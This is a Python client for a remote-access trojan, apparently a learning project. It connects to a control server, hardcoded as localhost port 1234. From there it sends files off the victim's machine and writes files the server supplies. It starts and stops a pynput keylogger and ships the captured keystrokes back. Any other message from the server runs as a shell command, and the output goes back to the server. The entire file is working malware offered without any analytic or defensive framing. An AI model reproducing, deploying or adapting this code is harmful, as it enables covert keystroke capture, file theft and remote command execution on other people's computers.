import socket
import subprocess
import threading
from pathlib import Path
from pynput.keyboard import Key,Listener

allkeys = '' # To store all pressed keys
keylogging_mode = 0 # Status mode keylogging (0 = off, 1 = on)

# Function that is called when the button is pressed
def pressed(key):
    global allkeys
    allkeys+=str(key)

# Function called when button is released (not used but defined for Listener)
def released(key):
    pass

# Function to start keylogging
def keylog():
    global l
    l = Listener(on_press=pressed, on_release=released)
    l.start()

# Configure network to connect the server
ip_address = '127.0.0.1'
port_number = 1234

# Create a client socket
# AF_INET == IPv4 & SOCK_STREAM == TCP
cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connecting to the server
cs.connect((ip_address, port_number))

# Send an initial message to the server
msg = "TEST CLIENT"
cs.send(msg.encode())

# Receive messages from the server
msg = cs.recv(1024).decode()

# Loop to receive and process messages/commands from the server
while msg!='quit':
    fullmsg = msg
    msg = list(msg.split(" "))

    # If the command from the server is to download a file
    if msg[0] == 'download':
        filename = msg[1]
        f = open(Path(filename), 'rb')
        contents = f.read()
        cs.send(contents)
        msg = cs.recv(1024).decode()
    # If the command from the server is to upload a file
    elif msg[0] == 'upload':
        filename = msg[1]
        filesize = int(msg[2])
        contents = cs.recv(filesize)
        f = open(Path(filename), 'wb')
        f.write(contents)
        f.close()
        cs.send('Got file'.encode())
        msg = cs.recv(1024).decode()
    # If the command from the server is to start keylogging
    elif fullmsg == 'keylog on':
        keylogging_mode = 1
        t1 = threading.Thread(target=keylog)
        t1.start()
        msg = "Keylogging has started"
        cs.send(msg.encode())
        msg = cs.recv(1024).decode()
    # If the command from the server is to stop keylogging
    elif fullmsg == 'keylog off':
        if keylogging_mode == 1:
            l.stop()
            t1.join()
            cs.send(allkeys.encode())
            allkeys = ''
            msg = cs.recv(1024).decode()
            keylogging_mode = 0
        elif keylogging_mode == 0:
            msg = "Keylogging should be started first"
            cs.send(msg.encode())
            msg = cs.recv(1024).decode()
    # For all other commands, run the command in the shell and send the output to the server
    else:
        p = subprocess.Popen(
            msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )
        output, error = p.communicate()
        if len(output) > 0:
            msg = str(output.decode())
        else:
            msg = str(error.decode())
        cs.send(msg.encode())
        msg = cs.recv(1024).decode()
        print(msg)

# Close the connection with the server
cs.close()